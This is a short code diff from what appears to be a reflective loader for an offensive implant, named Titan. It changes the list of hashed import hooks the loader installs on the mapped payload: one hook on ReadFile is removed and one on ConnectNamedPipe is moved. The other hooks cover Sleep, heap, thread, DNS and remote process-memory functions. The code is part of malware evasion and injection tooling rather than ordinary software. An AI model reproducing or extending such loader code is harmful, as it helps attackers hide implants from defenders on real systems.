@@ -115,7 +115,6 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 				LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0e07cd7e, PTR_TO_HOOK( Mem, Sleep_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x4b184b05, PTR_TO_HOOK( Mem, HeapFree_Hook ) );
-				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x84d15061, PTR_TO_HOOK( Mem, ReadFile_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xadc4062e, PTR_TO_HOOK( Mem, HeapAlloc_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xc165d757, PTR_TO_HOOK( Mem, ExitThread_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
@@ -123,9 +122,9 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x98baab11, PTR_TO_HOOK( Mem, CreateThread_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xdecfc1bf, PTR_TO_HOOK( Mem, GetProcAddress_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5775bd54, PTR_TO_HOOK( Mem, VirtualAllocEx_Hook ) );
+				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfd1438ae, PTR_TO_HOOK( Mem, SetThreadContext_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5b6b908a, PTR_TO_HOOK( Mem, VirtualProtectEx_Hook ) );
-				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5c3f8699, PTR_TO_HOOK( Mem, ReadProcessMemory_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xb7930ae8, PTR_TO_HOOK( Mem, WriteProcessMemory_Hook ) );
 				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0df1b3da, PTR_TO_HOOK( Mem, WaitForSingleObject_Hook ) );
